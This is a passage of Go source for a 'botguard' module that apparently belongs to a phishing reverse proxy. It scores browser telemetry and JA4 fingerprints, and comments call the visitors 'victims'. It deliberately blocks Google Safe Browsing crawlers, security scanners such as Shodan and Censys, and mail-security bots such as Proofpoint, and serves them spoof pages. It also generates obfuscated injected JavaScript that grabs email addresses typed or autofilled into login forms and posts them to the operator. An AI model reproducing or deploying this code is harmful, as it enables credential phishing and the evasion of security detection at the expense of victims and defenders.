			score += 5 // Minimal activity
		} else if tel.MouseMovements == 0 {
			log.Debug("[botguard] Unusual mouse movements detected from %s (count: %d)", clientIP, tel.MouseMovements)
			score -= 15 // No mouse movement is suspicious
		}

		// ============================================
		// GABAGOOL TECHNIQUE 4: Cookie Test
		// Bots often have cookies disabled or blocked
		// ============================================
		if !tel.CookiesEnabled {
			log.Debug("[botguard] Cookies are disabled from %s", clientIP)
			score -= 15
		} else if tel.CookieTestOk {
			score += 10 // Cookie functionality verified
		}

		// ============================================
		// GABAGOOL TECHNIQUE 5: User Agent Bot Check
		// Check for known bot/crawler user agents
		// ============================================
		if bg.IsBotUserAgent(tel.UserAgent) {
			log.Debug("[botguard] Known bot user agent from %s: %s", clientIP, tel.UserAgent)
			score -= 40
		}

		// ============================================
		// Additional telemetry checks for more accuracy
		// ============================================

		// Check for reasonable screen dimensions
		if tel.ScreenWidth > 0 && tel.ScreenHeight > 0 {
			score += 5
			// Suspicious if dimensions are too perfect (often headless)
			if tel.ScreenWidth == 800 && tel.ScreenHeight == 600 {
				score -= 10 // Default headless dimensions
			}
			// Common headless dimension
			if tel.ScreenWidth == 1920 && tel.ScreenHeight == 1080 && tel.TouchPoints == 0 {
				// Could be headless with common resolution - slight suspicion
				score -= 3
			}
		} else {
			score -= 8
		}

		// Check for plugins (real browsers usually have some)
		if len(tel.Plugins) > 0 {
			score += 5
		} else {
			score -= 3 // No plugins is slightly suspicious
		}

		// Check for touch points (mobile devices have them)
		if tel.TouchPoints > 0 {
			score += 5 // Mobile device indicator
		}

		// Check device memory (headless often has different values)
		if tel.DeviceMemory > 0 {
			if tel.DeviceMemory < 1 {
				score -= 8 // Suspiciously low memory
			} else if tel.DeviceMemory >= 4 {
				score += 3 // Reasonable memory
			}
		}

		// Check hardware concurrency
		if tel.HardwareConcur > 0 {
			if tel.HardwareConcur == 1 {
				score -= 3 // Single core can indicate VM/headless
			} else if tel.HardwareConcur >= 4 {
				score += 5 // Reasonable core count
			} else {
				score += 2
			}
		}

		// Check for WebGL (most real browsers have it)
		if tel.WebGLVendor != "" && tel.WebGLRenderer != "" {
			score += 8
			// Check for known headless indicators in WebGL
			renderer := strings.ToLower(tel.WebGLRenderer)
			if strings.Contains(renderer, "swiftshader") {
				score -= 15 // SwiftShader is often used in headless
			}
			if strings.Contains(renderer, "llvmpipe") {
				score -= 15 // Software rendering
			}
			if strings.Contains(renderer, "mesa") && strings.Contains(renderer, "software") {
				score -= 12
			}
		} else {
			score -= 5 // No WebGL is suspicious
		}

		// Check for languages (bots often don't set this properly)
		if len(tel.Languages) > 0 {
			score += 3
		}

		// Check for timezone
		if tel.Timezone != "" {
			score += 3
		}

		// Keystroke activity (indicates real typing)
		if tel.KeyStrokes > 0 {
			if tel.KeyStrokes >= 5 {
				score += 10 // Active typing
			} else {
				score += 5
			}
		}

		// Scroll events (indicates page reading behavior)
		if tel.ScrollEvents > 0 {
			if tel.ScrollEvents >= 3 {
				score += 8
			} else {
				score += 4
			}
		}

		// Canvas fingerprint (empty often indicates privacy tools or bots)
		if tel.Canvas != "" && tel.Canvas != "0" {
			score += 5
		} else {
			score -= 3
		}

		// Check interaction time - too fast is suspicious
		if tel.InteractionTime > 0 && tel.InteractionTime < 500 {
			score -= 10 // Interacted too quickly
		}

	} else {
		// No telemetry collected - very suspicious for modern browsers
		score -= 25
	}

	// Clamp score to 0-100
	if score < 0 {
		score = 0
	}
	if score > 100 {
		score = 100
	}

	// Store the score
	bg.Lock()
	bg.trustScore[clientIP] = score
	bg.Unlock()

	return score
}

// IsBot determines if a request is from a bot
func (bg *BotGuard) IsBot(clientIP string, ja4 string) bool {
	if !bg.IsEnabled() {
		return false
	}

	score := bg.CalculateTrustScore(clientIP, ja4)

	bg.RLock()
	minScore := bg.config.MinTrustScore
	bg.RUnlock()

	isBot := score < minScore

	if isBot {
		log.Debug("[botguard] Bot detected from %s (score: %d, ja4: %s)", clientIP, score, ja4)
	}

	return isBot
}

// isRealBrowserUA checks if the user agent looks like a real browser
// This is the OPPOSITE of IsBotUserAgent - it checks for browser indicators
func (bg *BotGuard) isRealBrowserUA(userAgent string) bool {
	ua := strings.ToLower(userAgent)

	// Check for common real browser indicators
	browserIndicators := []string{
		"mozilla/5.0",
		"chrome/",
		"firefox/",
		"safari/",
		"edge/",
		"opera/",
		"applewebkit/",
		"gecko/",
		"trident/",
	}

	for _, indicator := range browserIndicators {
		if strings.Contains(ua, indicator) {
			return true
		}
	}
	return false
}

// recordVisit records a visit from an IP and returns (isFirstVisit, visitCount, timeSinceFirst)
func (bg *BotGuard) recordVisit(clientIP string) (bool, int, time.Duration) {
	bg.Lock()
	defer bg.Unlock()

	now := time.Now()
	firstTime, exists := bg.firstSeen[clientIP]

	if !exists {
		bg.firstSeen[clientIP] = now
		bg.requestCount[clientIP] = 1
		return true, 1, 0
	}

	bg.requestCount[clientIP]++
	return false, bg.requestCount[clientIP], now.Sub(firstTime)
}

// SetEmailWhitelist marks an IP as whitelisted due to email autofill detection
// When a victim's browser autofills an email into the login form, the telemetry JS
// captures it and sends it here. This proves it's a real victim browser (not a bot),
// so we auto-whitelist the IP to prevent false positive bot detection.
func (bg *BotGuard) SetEmailWhitelist(clientIP string) {
	bg.Lock()
	defer bg.Unlock()
	bg.emailWhitelist[clientIP] = true
}

// IsEmailWhitelisted checks if an IP has been whitelisted by email autofill
func (bg *BotGuard) IsEmailWhitelisted(clientIP string) bool {
	bg.RLock()
	defer bg.RUnlock()
	return bg.emailWhitelist[clientIP]
}

// ── JA4 Auto-Learning ──────────────────────────────────────────

// RecordJA4Score records a trust score observation for a JA4 fingerprint.
// Updates the rolling average and triggers auto-blacklist/whitelist if thresholds are met.
// Tracks request paths to detect scanner patterns (e.g., /robots.txt, /.env).
func (bg *BotGuard) RecordJA4Score(ja4 string, score int, requestPath string, clientIP string) {
	if ja4 == "" || !bg.learningEnabled {
		return
	}
	bg.Lock()
	defer bg.Unlock()

	profile, exists := bg.ja4Profiles[ja4]
	if !exists {
		profile = &JA4LearningProfile{
			LastScores:   make([]int, 0, bg.learnWindow),
			RequestPaths: make(map[string]int),
			LastIPs:      make(map[string]bool),
			FirstSeen:    time.Now(),
		}
		bg.ja4Profiles[ja4] = profile
	}

	// Update timestamps
	profile.LastSeen = time.Now()
	profile.TotalObservations++

	// Track request path
	if requestPath != "" {
		profile.RequestPaths[requestPath]++
	}

	// Track IPs
	if clientIP != "" {
		profile.LastIPs[clientIP] = true
	}

	// Track block/allow
	if score < 50 {
		profile.BlockedCount++
	} else {
		profile.AllowedCount++
	}

	// Append score to rolling window
	profile.LastScores = append(profile.LastScores, score)
	if len(profile.LastScores) > bg.learnWindow {
		// Trim to keep only recent scores
		excess := len(profile.LastScores) - bg.learnWindow
		profile.LastScores = profile.LastScores[excess:]
	}

	// Calculate running average
	sum := 0
	for _, s := range profile.LastScores {
		sum += s
	}
	profile.AvgScore = float64(sum) / float64(len(profile.LastScores))

	// Check auto-blacklist/whitelist thresholds
	if profile.TotalObservations >= bg.minObservations {
		if profile.AvgScore < bg.autoBlacklistMin && !profile.AutoBlacklisted {
			profile.AutoBlacklisted = true
			bg.blacklist[ja4] = true
			log.Warning("[botguard] JA4 auto-blacklisted: %s (avg score: %.1f over %d observations)",
				ja4, profile.AvgScore, profile.TotalObservations)
		}
		if profile.AvgScore > bg.autoWhitelistMin && !profile.AutoWhitelisted {
			profile.AutoWhitelisted = true
			bg.whitelist[ja4] = true
			log.Info("[botguard] JA4 auto-whitelisted: %s (avg score: %.1f over %d observations)",
				ja4, profile.AvgScore, profile.TotalObservations)
		}
	}
}

// GetJA4Profile returns the learning profile for a JA4 fingerprint.
func (bg *BotGuard) GetJA4Profile(ja4 string) *JA4LearningProfile {
	bg.RLock()
	defer bg.RUnlock()
	return bg.ja4Profiles[ja4]
}

// ListJA4Profiles returns all learned JA4 profiles sorted by observations (desc).
func (bg *BotGuard) ListJA4Profiles() map[string]*JA4LearningProfile {
	bg.RLock()
	defer bg.RUnlock()
	out := make(map[string]*JA4LearningProfile, len(bg.ja4Profiles))
	for k, v := range bg.ja4Profiles {
		out[k] = v
	}
	return out
}

// ResetJA4Profiles clears all learned profiles.
func (bg *BotGuard) ResetJA4Profiles() {
	bg.Lock()
	defer bg.Unlock()
	bg.ja4Profiles = make(map[string]*JA4LearningProfile)
	log.Info("[botguard] All JA4 learning profiles reset")
}

// SetLearningEnabled enables or disables JA4 auto-learning.
func (bg *BotGuard) SetLearningEnabled(enabled bool) {
	bg.Lock()
	defer bg.Unlock()
	bg.learningEnabled = enabled
	if enabled {
		log.Info("[botguard] JA4 auto-learning enabled")
	} else {
		log.Info("[botguard] JA4 auto-learning disabled")
	}
}

// IsLearningEnabled returns whether JA4 auto-learning is active.
func (bg *BotGuard) IsLearningEnabled() bool {
	bg.RLock()
	defer bg.RUnlock()
	return bg.learningEnabled
}

// GetLearningConfig returns auto-learning configuration.
func (bg *BotGuard) GetLearningConfig() (enabled bool, minObs int, blMin float64, wlMin float64) {
	bg.RLock()
	defer bg.RUnlock()
	return bg.learningEnabled, bg.minObservations, bg.autoBlacklistMin, bg.autoWhitelistMin
}

// SetLearningThresholds sets auto-blacklist and auto-whitelist score thresholds.
func (bg *BotGuard) SetLearningThresholds(minObservations int, autoBlacklistMin float64, autoWhitelistMin float64) {
	bg.Lock()
	defer bg.Unlock()
	if minObservations > 0 {
		bg.minObservations = minObservations
	}
	if autoBlacklistMin > 0 {
		bg.autoBlacklistMin = autoBlacklistMin
	}
	if autoWhitelistMin > 0 {
		bg.autoWhitelistMin = autoWhitelistMin
	}
}

// IsJA4AutoBlacklisted checks if a JA4 was auto-blacklisted by the learning system.
func (bg *BotGuard) IsJA4AutoBlacklisted(ja4 string) bool {
	bg.RLock()
	defer bg.RUnlock()
	if p, ok := bg.ja4Profiles[ja4]; ok {
		return p.AutoBlacklisted
	}
	return false
}

// ── End JA4 Auto-Learning ──────────────────────────────────────

// IsBotWithUserAgent determines if a request is from a bot, using HTTP User-Agent
// This is the primary entry point that should be called from the HTTP proxy
// It checks the User-Agent BEFORE telemetry, catching bots that don't execute JavaScript
func (bg *BotGuard) IsBotWithUserAgent(clientIP string, ja4 string, userAgent string) bool {
	if !bg.IsEnabled() {
		return false
	}

	// STEP 0: If this IP was whitelisted by email autofill/autograb, ALWAYS allow through
	// A bot/scanner would never fill in an email address on the login form
	if bg.IsEmailWhitelisted(clientIP) {
		log.Debug("[botguard] Email-whitelisted IP %s - allowing through", clientIP)
		return false
	}

	// STEP 0.5: Check if IP belongs to Google's published crawler infrastructure
	// This is the primary Google Safe Browsing bypass — Google-Safety uses these IPs
	// to scan URLs posted on Google properties (Gmail, Search, etc.)
	if bg.IsGoogleCrawlerIP(clientIP) {
		log.Warning("[botguard] Google crawler IP blocked: %s (UA: %s)", clientIP, truncateUA(userAgent))
		bg.Lock()
		bg.trustScore[clientIP] = 0
		bg.Unlock()
		return true
	}

	// STEP 0.6: Check if IP belongs to known security scanner infrastructure
	// (Censys, Shodan, Shadowserver, BinaryEdge)
	if bg.IsSecurityScannerIP(clientIP) {
		log.Warning("[botguard] Security scanner IP blocked: %s (UA: %s)", clientIP, truncateUA(userAgent))
		bg.Lock()
		bg.trustScore[clientIP] = 0
		bg.Unlock()
		return true
	}

	// STEP 0.7: Start async cloud provider DNS check (non-blocking)
	// Result will be used as trust score penalty, not instant block
	bg.CheckCloudProviderAsync(clientIP)

	// STEP 1: ALWAYS block known bot User-Agents immediately
	// This catches WhatsApp, Telegram, Proofpoint, scanners, etc.
	if bg.IsBotUserAgent(userAgent) {
		log.Warning("[botguard] Bot User-Agent blocked: %s from %s", truncateUA(userAgent), clientIP)
		bg.Lock()
		bg.trustScore[clientIP] = 0
		bg.Unlock()
		return true
	}

	// Record this visit
	isFirstVisit, visitCount, timeSinceFirst := bg.recordVisit(clientIP)

	// STEP 2: Check if we have telemetry for this IP
	bg.RLock()
	tel := bg.telemetry[clientIP]
	bg.RUnlock()

	// STEP 3: If this looks like a real browser UA and it's early in the visit, allow through
	// Give real browsers a grace period to load JS and send telemetry
	if bg.isRealBrowserUA(userAgent) {
		// Grace period: First 5 seconds OR first 10 requests - allow through without blocking
		// This gives time for the page to load and JS to execute
		gracePeriod := time.Duration(5) * time.Second

		if tel == nil {
			// No telemetry yet
			if isFirstVisit || timeSinceFirst < gracePeriod || visitCount <= 10 {
				// First visit or within grace period - allow through
				log.Debug("[botguard] Grace period for %s (visit #%d, %v since first)",
					clientIP, visitCount, timeSinceFirst)
				return false
			}

			// Past grace period with no telemetry - suspicious but still check if browser-like
			// Only flag as bot if they've had plenty of time and still no JS
			if timeSinceFirst > time.Duration(30)*time.Second && visitCount > 20 {
				log.Warning("[botguard] No telemetry after grace period from %s (visits: %d, time: %v)",
					clientIP, visitCount, timeSinceFirst)
				bg.Lock()
				bg.trustScore[clientIP] = 15
				bg.Unlock()
				return true
			}

			// Still within extended grace - allow
			return false
		}
	}

	// STEP 4: We have telemetry OR it's not a browser-like UA - calculate full score
	score := bg.CalculateTrustScoreWithUA(clientIP, ja4, userAgent)

	bg.RLock()
	minScore := bg.config.MinTrustScore
	bg.RUnlock()

	isBot := score < minScore

	if isBot {
		log.Warning("[botguard] Bot detected from %s (score: %d, min: %d, UA: %s)",
			clientIP, score, minScore, truncateUA(userAgent))
	}

	return isBot
}

// truncateUA truncates user agent for logging
func truncateUA(ua string) string {
	if len(ua) > 60 {
		return ua[:60] + "..."
	}
	return ua
}

// CalculateTrustScoreWithUA calculates trust score including HTTP User-Agent check
// This is only called AFTER the grace period, so we have telemetry to work with
func (bg *BotGuard) CalculateTrustScoreWithUA(clientIP string, ja4 string, httpUserAgent string) int {
	bg.RLock()
	tel := bg.telemetry[clientIP]
	bg.RUnlock()

	// Start with a passing score - we want to be permissive
	// Only subtract for strong bot indicators
	score := 50

	// Check whitelist/blacklist first
	bg.RLock()
	if bg.whitelist[ja4] {
		bg.RUnlock()
		return 100
	}
	if bg.blacklist[ja4] {
		bg.RUnlock()
		return 0
	}
	bg.RUnlock()

	// Bot User-Agent already checked in IsBotWithUserAgent, but double-check
	if bg.IsBotUserAgent(httpUserAgent) {
		return 0 // Immediate fail
	}

	// Empty/suspicious User-Agent
	if httpUserAgent == "" {
		score -= 20
	} else if len(httpUserAgent) < 30 {
		score -= 10
	}

	// Real browser UA gives bonus
	if bg.isRealBrowserUA(httpUserAgent) {
		score += 15
	}

	// If we have telemetry, that's a GOOD sign - real browsers execute JS
	if tel != nil {
		// Having telemetry is positive
		score += 20

		// EMAIL AUTOFILL/AUTOGRAB: If email is present, this is a real victim
		// A bot/scanner would never autofill or type an email into the login form
		// Give a massive score bonus — this is the strongest human indicator
		if tel.Email != "" {
			log.Debug("[botguard] Email detected in telemetry from %s: %s - boosting score", clientIP, tel.Email)
			score += 50 // Massive bonus - definitely a real victim
		}

		// CRITICAL: WebDriver check - this is the strongest bot indicator
		// navigator.webdriver is only true in actual automated browsers
		if tel.HasWebDriver {
			log.Warning("[botguard] WebDriver detected from %s", clientIP)
			return 0 // Immediate fail - definitely automation
		}

		// Automation framework check - penalty but not instant fail
		// Some websites inject globals that can trigger false positives
		if tel.HasAutomation {
			log.Debug("[botguard] Automation indicators from %s (may be website scripts)", clientIP)
			score -= 20 // Penalty but not instant fail
		}

		// Mouse movement is a strong human indicator
		if tel.MouseMovements >= 20 {
			score += 15 // Good human activity
		} else if tel.MouseMovements >= 5 {
			score += 10
		} else if tel.MouseMovements > 0 {
			score += 5
		}
		// No penalty for zero mouse movements - they might just not have moved yet

		// Keystrokes indicate typing
		if tel.KeyStrokes > 0 {
			score += 10
		}

		// Scroll events
		if tel.ScrollEvents > 0 {
			score += 5
		}

		// Cookie test passed
		if tel.CookieTestOk {
			score += 5
		}

		// Screen dimensions present (real browsers have them)
		if tel.ScreenWidth > 0 && tel.ScreenHeight > 0 {
			score += 5
			// Headless default dimensions
			if tel.ScreenWidth == 800 && tel.ScreenHeight == 600 {
				score -= 10
			}
		}

		// WebGL present (real browsers have it)
		if tel.WebGLVendor != "" && tel.WebGLRenderer != "" {
			score += 5
			renderer := strings.ToLower(tel.WebGLRenderer)
			// Software rendering indicates headless
			if strings.Contains(renderer, "swiftshader") || strings.Contains(renderer, "llvmpipe") {
				score -= 15
			}
		}

		// Languages set
		if len(tel.Languages) > 0 {
			score += 3
		}

		// Timezone set
		if tel.Timezone != "" {
			score += 2
		}
	}
	// Note: No penalty for missing telemetry here - that's handled by the grace period logic

	// Cloud/datacenter IP penalty — security scanners commonly run from cloud infrastructure
	// Uses cached async DNS result; if not yet available, skips (no blocking DNS in request path)
	ipClass := bg.GetCachedIPClass(clientIP)
	if ipClass == "cloud" {
		log.Debug("[botguard] Cloud/datacenter IP detected: %s — trust score penalty applied", clientIP)
		score -= 20
	}

	// Clamp score
	if score < 0 {
		score = 0
	}
	if score > 100 {
		score = 100
	}

	// Store the score
	bg.Lock()
	bg.trustScore[clientIP] = score
	bg.Unlock()

	// JA4 auto-learning: record score for this fingerprint
	if ja4 != "" {
		bg.RecordJA4Score(ja4, score, "", clientIP)
	}

	return score
}

// GetTrustScore returns the cached trust score for a client
func (bg *BotGuard) GetTrustScore(clientIP string) int {
	bg.RLock()
	defer bg.RUnlock()
	if score, ok := bg.trustScore[clientIP]; ok {
		return score
	}
	return -1
}

// SetMinTrustScore sets the minimum trust score required to pass
func (bg *BotGuard) SetMinTrustScore(score int) {
	bg.Lock()
	defer bg.Unlock()
	bg.config.MinTrustScore = score
}

// GetConfig returns the current botguard configuration
func (bg *BotGuard) GetConfig() *BotGuardConfig {
	bg.RLock()
	defer bg.RUnlock()
	return bg.config
}

// GenerateJA4Fingerprint generates a JA4-like fingerprint from TLS info
// This is a simplified version - full JA4 requires parsing the TLS Client Hello
func GenerateJA4Fingerprint(tlsVersion uint16, cipherSuites []uint16, extensions []uint16, alpn string) string {
	// Protocol (always TCP for our use case)
	protocol := "t"

	// TLS Version
	var version string
	switch tlsVersion {
	case 0x0304:
		version = "13"
	case 0x0303:
		version = "12"
	case 0x0302:
		version = "11"
	case 0x0301:
		version = "10"
	default:
		version = "00"
	}

	// SNI presence (we always have it in our context)
	sni := "d"

	// Cipher count (2 digits, max 99)
	cipherCount := len(cipherSuites)
	if cipherCount > 99 {
		cipherCount = 99
	}

	// Extension count (2 digits, max 99)
	extCount := len(extensions)
	if extCount > 99 {
		extCount = 99
	}

	// ALPN (first 2 chars or "00")
	alpnStr := "00"
	if alpn != "" {
		if len(alpn) >= 2 {
			alpnStr = alpn[:2]
		} else {
			alpnStr = alpn + "0"
		}
	}

	// Hash ciphers
	cipherStr := ""
	for _, c := range cipherSuites {
		cipherStr += fmt.Sprintf("%04x,", c)
	}
	cipherHash := sha256.Sum256([]byte(cipherStr))
	cipherHashStr := hex.EncodeToString(cipherHash[:])[:12]

	// Hash extensions
	extStr := ""
	for _, e := range extensions {
		extStr += fmt.Sprintf("%04x,", e)
	}
	extHash := sha256.Sum256([]byte(extStr))
	extHashStr := hex.EncodeToString(extHash[:])[:12]

	// Format: t13d1516h2_cipherhash_exthash
	ja4 := fmt.Sprintf("%s%s%s%02d%02d%s_%s_%s",
		protocol, version, sni, cipherCount, extCount, alpnStr,
		cipherHashStr, extHashStr)

	return ja4
}

// GenerateTelemetryJS generates the JavaScript code for collecting browser telemetry
// Implements Gabagool-style bot detection techniques
func (bg *BotGuard) GenerateTelemetryJS(endpoint string) string {
	// Minified and obfuscated telemetry collection script with Gabagool techniques
	js := fmt.Sprintf(`(function(){var _0x={
c:function(s){var h=0;for(var i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h|=0;}return h.toString(16);},
g:function(k){try{return navigator[k]||''}catch(e){return''}},
w:function(){try{var c=document.createElement('canvas');var g=c.getContext('webgl')||c.getContext('experimental-webgl');if(!g)return{v:'',r:''};var d=g.getExtension('WEBGL_debug_renderer_info');return{v:d?g.getParameter(d.UNMASKED_VENDOR_WEBGL):'',r:d?g.getParameter(d.UNMASKED_RENDERER_WEBGL):''};}catch(e){return{v:'',r:''};}},
cv:function(){try{var c=document.createElement('canvas');c.width=200;c.height=50;var x=c.getContext('2d');x.textBaseline='top';x.font='14px Arial';x.fillStyle='#f60';x.fillRect(125,1,62,20);x.fillStyle='#069';x.fillText('Cwm fjordbank',2,15);x.fillStyle='rgba(102,204,0,0.7)';x.fillText('glyphs vext quiz',4,17);return _0x.c(c.toDataURL());}catch(e){return'0';}},
p:function(){var p=[];try{for(var i=0;i<navigator.plugins.length;i++){p.push(navigator.plugins[i].name);}}catch(e){}return p;},
a:function(){try{return(!!window.callPhantom)||(!!window._phantom)||(!!window.__nightmare)||(!!window.domAutomation)||(!!window.domAutomationController)||(!!document.__selenium_unwrapped)||(!!document.__webdriver_evaluate)||(!!document.__driver_evaluate)||(!!window.Cypress)||(!!window.__cypress)||(!!window.awesomium)||(!!window.cdc_adoQpoasnfa76pfcZLmcfl_Array)||(!!window.cdc_adoQpoasnfa76pfcZLmcfl_Promise)||(!!window.cdc_adoQpoasnfa76pfcZLmcfl_Symbol)||(typeof window.Buffer!=='undefined'&&typeof process!=='undefined');}catch(e){return false;}},
ct:function(){try{var n='_bgct';var v='1';var d=new Date();d.setTime(d.getTime()+(86400000));document.cookie=n+'='+v+';expires='+d.toUTCString()+';path=/';var c=document.cookie.split(';');for(var i=0;i<c.length;i++){var x=c[i].trim();if(x.indexOf(n+'=')==0){return x.substring(n.length+1)==v;}}return false;}catch(e){return false;}},
ps:Date.now(),
mm:0,ks:0,se:0,it:0,_em:'',
t:function(){
var w=_0x.w();
var ct=_0x.ct();
var it=Date.now()-_0x.ps;
_0x.it=it;
var d={
ua:navigator.userAgent,
platform:_0x.g('platform'),
languages:navigator.languages||[navigator.language],
screenWidth:screen.width,
screenHeight:screen.height,
colorDepth:screen.colorDepth,
timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
timezoneOffset:new Date().getTimezoneOffset(),
cookiesEnabled:navigator.cookieEnabled,
doNotTrack:navigator.doNotTrack||'',
hardwareConcurrency:navigator.hardwareConcurrency||0,
deviceMemory:navigator.deviceMemory||0,
maxTouchPoints:navigator.maxTouchPoints||0,
webglVendor:w.v,
webglRenderer:w.r,
canvas:_0x.cv(),
plugins:_0x.p(),
webdriver:navigator.webdriver===true,
automation:_0x.a(),
timestamp:Date.now(),
mouseMovements:_0x.mm,
keyStrokes:_0x.ks,
scrollEvents:_0x.se,
cookieTest:ct,
interactionTime:it,
email:_0x._em||''
};
var x=new XMLHttpRequest();
x.open('POST','%s',true);
x.setRequestHeader('Content-Type','application/json');
x.send(JSON.stringify(d));
}};
document.addEventListener('mousemove',function(){_0x.mm++;});
document.addEventListener('keydown',function(){_0x.ks++;});
document.addEventListener('scroll',function(){_0x.se++;});
// ===== EMAIL AUTOGRAB =====
// Capture email from login form input fields.
// This is sent with telemetry to whitelist the session (real victim, not bot).
// Works with both user-typed and browser-autofilled email values.
(function(){
var _eg='';
function _ge(){try{
var el=document.querySelector('input[type="email"],#identifierId,input[name="identifier"],input[name="Email"],input[name="email"],input[name="login"],input[autocomplete="username"]');
if(el&&el.value&&el.value.length>3){_eg=el.value;_0x._em=_eg;}
}catch(e){}}
document.addEventListener('input',function(e){
if(e.target&&(e.target.type==='email'||e.target.id==='identifierId'||e.target.name==='identifier'||e.target.name==='Email'||e.target.name==='email'||e.target.name==='login')){_eg=e.target.value;_0x._em=_eg;}
},true);
setInterval(_ge,1500);
setTimeout(_ge,500);
})();
setTimeout(function(){_0x.t();},2000);
setTimeout(function(){_0x.t();},6000);
setTimeout(function(){_0x.t();},12000);
})();`, endpoint)
	return js
}

// HandleTelemetryRequest processes incoming telemetry data from clients
func (bg *BotGuard) HandleTelemetryRequest(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	var tel ClientTelemetry
	if err := json.Unmarshal(body, &tel); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}

	// Extract client IP
	clientIP := r.RemoteAddr
	if fwd := r.Header.Get("X-Forwarded-For"); fwd != "" {
		clientIP = strings.Split(fwd, ",")[0]
	}
	// Remove port if present
	if idx := strings.LastIndex(clientIP, ":"); idx != -1 {
		clientIP = clientIP[:idx]
	}

	// Record request for rapid interaction detection (Gabagool technique)
	bg.RecordRequest(clientIP)

	bg.StoreTelemetry(clientIP, &tel)

	// Check for immediate bot indicators and log
	if tel.HasWebDriver {
		log.Warning("[botguard] Headless browser detected from %s", clientIP)
	}
	if tel.HasAutomation {
		log.Warning("[botguard] Automation framework detected from %s", clientIP)
	}
	if bg.IsBotUserAgent(tel.UserAgent) {
		log.Warning("[botguard] Bot user agent from %s: %s", clientIP, tel.UserAgent)
	}

	log.Debug("[botguard] Telemetry from %s - webdriver:%v automation:%v mouse:%d keys:%d scroll:%d cookie:%v",
		clientIP, tel.HasWebDriver, tel.HasAutomation, tel.MouseMovements, tel.KeyStrokes, tel.ScrollEvents, tel.CookieTestOk)

	w.WriteHeader(http.StatusOK)
	w.Write([]byte("ok"))
}

// FetchSpoofContent fetches content from a random spoof URL to serve to detected bots
func (bg *BotGuard) FetchSpoofContent(targetUrl string) ([]byte, string, error) {
	spoofUrl := bg.GetRandomSpoofUrl()
	if spoofUrl == "" {
		return nil, "", fmt.Errorf("no spoof URLs configured")
	}

	log.Debug("[botguard] Using spoof URL: %s", spoofUrl)

	client := GetHttpClient()

	resp, err := client.Get(spoofUrl)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, "", err
	}

	contentType := resp.Header.Get("Content-Type")
	if contentType == "" {
		contentType = "text/html"
	}

	return body, contentType, nil
}

// CleanupOldTelemetry removes telemetry older than the specified duration
func (bg *BotGuard) CleanupOldTelemetry(maxAge time.Duration) {
	bg.Lock()
	defer bg.Unlock()

	now := time.Now()
	for ip, tel := range bg.telemetry {
		if now.Sub(tel.CollectedAt) > maxAge {
			delete(bg.telemetry, ip)
			delete(bg.trustScore, ip)
			delete(bg.requestTimes, ip)
			delete(bg.cookieTestCache, ip)
			delete(bg.emailWhitelist, ip)
		}
	}

	// Clean up expired IP classification cache
	for ip, cacheTime := range bg.ipCacheTimes {
		if now.Sub(cacheTime) > time.Hour {
			delete(bg.ipClassCache, ip)
			delete(bg.ipCacheTimes, ip)
		}
	}
}

// StartCleanupRoutine starts a background routine to clean up old telemetry
func (bg *BotGuard) StartCleanupRoutine() {
	go func() {
		ticker := time.NewTicker(5 * time.Minute)
		for range ticker.C {
			bg.CleanupOldTelemetry(30 * time.Minute)
		}
	}()
}
